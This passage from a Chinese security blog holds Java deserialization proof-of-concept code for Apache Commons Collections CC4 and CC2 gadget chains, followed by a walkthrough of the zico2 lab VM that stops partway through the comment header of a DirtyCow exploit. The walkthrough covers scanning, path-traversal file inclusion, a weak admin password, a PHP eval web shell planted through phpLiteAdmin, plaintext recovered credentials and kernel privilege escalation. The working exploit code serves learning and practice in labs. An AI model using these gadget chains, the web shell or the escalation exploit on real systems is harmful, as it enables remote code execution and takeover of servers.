<p>size为0，那么右移三位还是0，然后减一，使i的值为-1，导致不满足循环的条件，无法进入循环</p>
<p>那么我们想要进入循环就要使size&gt;&gt;&gt;1&#x3D;1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907202643216.png"
                      alt="image-20230907202643216"
                ></p>
<p>然后当size等于2的时候右移三位值为1</p>
<p>所以我们至少向队列中传入两个数据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br></pre></td></tr></table></figure></div>

<p>但是添加后，即使我们不进行反序列化也会弹出计算器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203047503.png"
                      alt="image-20230907203047503"
                ></p>
<p>我们这里跟进到add分析一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203138701.png"
                      alt="image-20230907203138701"
                ></p>
<p>继续跟进</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean offer(E e) &#123;</span><br><span class="line">    if (e == null)</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    modCount++;</span><br><span class="line">    int i = size;</span><br><span class="line">    if (i &gt;= queue.length)</span><br><span class="line">        grow(i + 1);</span><br><span class="line">    size = i + 1;</span><br><span class="line">    if (i == 0)</span><br><span class="line">        queue[0] = e;</span><br><span class="line">    else</span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们添加了两个元素，所以size&#x3D;2</p>
<p>最终会调用到siftip，继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203824052.png"
                      alt="image-20230907203824052"
                ></p>
<p>同样的comparator不为空，这里会调用siftupUsingComparator()方法</p>
<p>继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203940479.png"
                      alt="image-20230907203940479"
                ></p>
<p>在这里也会调用到compare方法进而触发了后续的利用链，造成了命令执行</p>
<p>其实这里和我们前面代码本地执行的解决方法一样</p>
<p>在add前传递一个假的chaintransform，在add后再将真的chaintransform传进去</p>
<p>那我们这里还可以用ConstantTransformer来实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br></pre></td></tr></table></figure></div>

<p>然后再添加完，再通过反射修改为chaintransformer</p>
<p>反射修改</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c= transformingComparator.getClass();</span><br><span class="line"> Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line"> transformField.setAccessible(true);</span><br><span class="line"> transformField.set(transformingComparator,chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CC4  &#123;</span><br><span class="line">    public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue =new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907205025239.png"
                      alt="image-20230907205025239"
                ></p>
<p>然后进行反序列化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907205044593.png"
                      alt="image-20230907205044593"
                ></p>
<p>成功弹出了计算器。</p>
<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907210104034.png"
                      alt="image-20230907210104034"
                ></p>
<h1 id="CommonsCollections2利用链分析"><a href="#CommonsCollections2利用链分析" class="headerlink" title="CommonsCollections2利用链分析"></a>CommonsCollections2利用链分析</h1><p>在上面CC4中我们是通过tranformeringComparator的cpmpare方法调用TiAXFilter类去调用后续的通过利用TemplatesImpl加载字节码进行命令执行</p>
<p>但是我们在CC3中除了利用TiAXFilter类去调用后续的TemplatesImpl加载字节码还有一种方法是通过invokerTransformer去调用TemplatesImpl的newTransformer方法</p>
<p>进行调用后续的加载字节码进行命令执行</p>
<p>而CC2就是用这种方法去调用后续利用链</p>
<p>所以说CC2就是CC4的前半部分利用链和CC3通过Invokertransform调用TemplatesImpl去动态加载字节码的结合</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908105610221.png"
                      alt="image-20230908105610221"
                ></p>
<p>那这里直接把前面的代码结合一下就行了</p>
<h2 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package leijiazai;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC2 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator( new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue =new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行测试：</p>
<p>序列化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908105736346.png"
                      alt="image-20230908105736346"
                ></p>
<p>反序列化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908105757687.png"
                      alt="image-20230908105757687"
                ></p>
<h2 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h2><p>当然其实我们这里也可以不用chaintransform</p>
<p>直接调用invokertransform</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908111136994.png"
                      alt="image-20230908111136994"
                ></p>
<p>POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC22 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">         setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908112513474.png"
                      alt="image-20230908112513474"
                ></p>
<h2 id="三、总结-1"><a href="#三、总结-1" class="headerlink" title="三、总结"></a>三、总结</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908112556125.png"
                      alt="image-20230908112556125"
                ></p>
]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>zico2靶机打靶记录</title>
    <url>/2023/09/08/zico2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="一、漏洞平台搭建"><a href="#一、漏洞平台搭建" class="headerlink" title="一、漏洞平台搭建"></a>一、漏洞平台搭建</h2><p>我们下载得到的是一个ova后缀的文件，OVA 文件是一种打包格式，它将虚拟机的相关文件（如虚拟磁盘映像、虚拟机配置信息、操作系统镜像等）打包成一个单独的文件，以便于传输、分享和部署虚拟机。</p>
<p>我这里可以直接导入这个靶场</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172324367.png"
                      alt="image-20230907172324367"
                ></p>
<p>通过打开我们下载的ova文件导入靶场</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172503984.png"
                      alt="image-20230907172503984"
                ></p>
<p>我们这里设置导入虚拟机的名称和存放位置</p>
<p>然后点击导入就可以导入这个靶机了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172606614.png"
                      alt="image-20230907172606614"
                ></p>
<p>然后我们开启靶机就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907172731134.png"
                      alt="image-20230907172731134"
                ></p>
<p>这里就启动成功了</p>
<h2 id="二、主机发现"><a href="#二、主机发现" class="headerlink" title="二、主机发现"></a>二、主机发现</h2><p>首先我们要先获取到目标靶机的ip地址</p>
<p>由于目标靶机和kali在同一网段，我们这里直接用kali扫描网段存活主机</p>
<p>命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906112007294.png"
                      alt="image-20230906112007294"
                ></p>
<p>通过对网段存活主机的扫描可以得到我们目标靶机的ip地址</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>上面我们通过arp协议扫描到了目标靶机的ip地址</p>
<p>但是为了能够进一步渗透我们需要对目标靶机进行信息收集</p>
<p>nmap扫描目标靶机开放的端口</p>
<p>命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.133 </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113648922.png"
                      alt="image-20230906113648922"
                ></p>
<p>目标靶机开放了22端口和80端口</p>
<p>说明目标靶机开放了web服务</p>
<p>访问响应的web服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230906113816865.png"
                      alt="image-20230906113816865"
                ></p>
<h2 id="三、漏洞扫描与利用"><a href="#三、漏洞扫描与利用" class="headerlink" title="三、漏洞扫描与利用"></a>三、漏洞扫描与利用</h2><p>访问网站可以看到这是一个类似于商店类型的网站</p>
<p>首先就是对网站的各个功能点，页面进行测试，看看能不能找到利用的点</p>
<p>在对网站功能进行查看的时候可以看到在 Service存在一个跳转按钮</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907111909544.png"
                      alt="image-20230907111909544"
                ></p>
<p>点击后跳转到了一个商品页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131210092.png"
                      alt="image-20230907131210092"
                ></p>
<p>我们可以看到这个所传递的参数和路由</p>
<p><a class="link"   href="http://192.168.113.133/view.php?page=tools.html" >http://192.168.113.133/view.php?page=tools.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里猜测后台处理逻辑是通过page参数将我们要访问的页面传递给view.php进行处理后将相应的页面传递给前端。</p>
<p>我们这里把参数值改为index.html</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131613066.png"
                      alt="image-20230907131613066"
                ></p>
<p>可以看到成功返回了首页面</p>
<p>但是只能返回设定路径下的文件</p>
<p>比如我们这里尝试返回根目录下的&#x2F;etc&#x2F;passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907131835473.png"
                      alt="image-20230907131835473"
                ></p>
<p>回显是空，说明这个只能返回对应目录下的文件，但是如果网站过滤不严格的话，我们完全可以通过..&#x2F;向上一级跳跃</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907132400583.png"
                      alt="image-20230907132400583"
                ></p>
<p>读取成功，说明这里存在文件包含漏洞</p>
<p>但是这个漏洞也只是可以让我们对服务器的一下文件进行读取和查看，并不能帮助我们直接拿下这台服务器</p>
<p>其他的功能点并没有找到明显可以利用的漏洞</p>
<p>通过dirsearch工具对网站目录进行扫描</p>
<p>命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.113.133</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133017583.png"
                      alt="image-20230907133017583"
                ></p>
<p>很明显这里存在一个dbadmin路由</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133051115.png"
                      alt="image-20230907133051115"
                ></p>
<p>访问可以发现存在两个页面一个是首页，另外一个是执行数据库操作的文件</p>
<p>访问test_db.php</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133250970.png"
                      alt="image-20230907133250970"
                ></p>
<p>尝试弱口令登录</p>
<p>admin可以登录成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907133408575.png"
                      alt="image-20230907133408575"
                ></p>
<p>这是一个对数据库进行操作的页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134334708.png"
                      alt="image-20230907134334708"
                ></p>
<p>在数据库中我们可以得到两组账号密码</p>
<p>密码是被md5加密的，进行md5解密</p>
<p>可以得到两组账号密码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root：34kroot34</span><br><span class="line">zico: zico2215@</span><br></pre></td></tr></table></figure></div>

<p>尝试ssh登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135213443.png"
                      alt="image-20230907135213443"
                ></p>
<p>登录失败</p>
<p>这是一个管理 SQLite 数据库的开源 web 应用程序phpLiteAdmin 而且我们还给出了版本号</p>
<p>通过漏洞工具searchsploit去查询对应版本所存在的漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907134132458.png"
                      alt="image-20230907134132458"
                ></p>
<p>存在远程代码注入漏洞</p>
<p>那我们可以通过这个漏洞写入后门文件。然后通过文件包含漏洞访问这个后门文件进行shell利用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135835527.png"
                      alt="image-20230907135835527"
                ></p>
<p>创建的数据库文件是存在于&#x2F;user&#x2F;databases下的</p>
<p>并且对文件后缀并没有限制</p>
<p>那我们就可以创建一个php后门文件</p>
<p>然后在文件中写入一句话木马</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135415483.png"
                      alt="image-20230907135415483"
                ></p>
<p>创建一个shell.php文件</p>
<p>设置表名和表的数量</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907135935783.png"
                      alt="image-20230907135935783"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140556674.png"
                      alt="image-20230907140556674"
                ></p>
<p>在default value值出写入我们的一句话木马</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>点击创建我们的木马文件就成功写入了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141321927.png"
                      alt="image-20230907141321927"
                ></p>
<p>但是因为我们写入的后门文件是在&#x2F;usr&#x2F;databases下</p>
<p>不能直接访问</p>
<p>所以我们这里通过前面的文件包含漏洞包含到这个后门文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907140815609.png"
                      alt="image-20230907140815609"
                ></p>
<p>蚁剑连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141231935.png"
                      alt="image-20230907141231935"
                ></p>
<p>成功进入到服务器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907141356536.png"
                      alt="image-20230907141356536"
                ></p>
<p>然后在服务器文件中</p>
<p>查找靶机中有没有存在敏感信息。最终在家目录中wordpress中的配置文件<code>wp-config.php</code>中找到了<code>zico</code>账号和密码 <code>sWfCsfJSPV9H3AmQzw8</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142001637.png"
                      alt="image-20230907142001637"
                ></p>
<p>尝试ssh登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142111950.png"
                      alt="image-20230907142111950"
                ></p>
<p>登录成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142139159.png"
                      alt="image-20230907142139159"
                ></p>
<p>但是可以看到这个账号只是普通用户权限</p>
<p>我们要拿下这太服务器就要把权限提升到root权限</p>
<h2 id="四、脏牛提权"><a href="#四、脏牛提权" class="headerlink" title="四、脏牛提权"></a>四、脏牛提权</h2><p>查看一下内核版本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907142424239.png"
                      alt="image-20230907142424239"
                ></p>
<p>内核版本是3.2.0，那我们这里可以内核漏洞进行脏牛提权，脏牛漏洞影响版本低于3.9的liunx内核</p>
<p>利用exp：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span><br><span class="line">// as a base and automatically generates a new passwd line.</span><br><span class="line">// The user will be prompted for the new password when the binary is run.</span><br><span class="line">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span><br><span class="line">// and overwrites the root account with the generated line.</span><br><span class="line">// After running the exploit you should be able to login with the newly</span><br><span class="line">// created user.</span><br><span class="line">//</span><br><span class="line">// To use this exploit modify the user values according to your needs.</span><br><span class="line">//   The default is &quot;firefart&quot;.</span><br><span class="line">//</span><br><span class="line">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span><br><span class="line">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span><br><span class="line">//</span><br><span class="line">// Compile with:</span><br><span class="line">//   gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">//</span><br><span class="line">// Then run the newly create binary by either doing:</span><br><span class="line">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span><br><span class="line">//</span><br><span class="line">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span><br><span class="line">//</span><br><span class="line">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span><br><span class="line">//   mv /tmp/passwd.bak /etc/passwd</span><br><span class="line">//</span><br><span class="line">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span><br><span class="line">// https://firefart.at</span><br><span 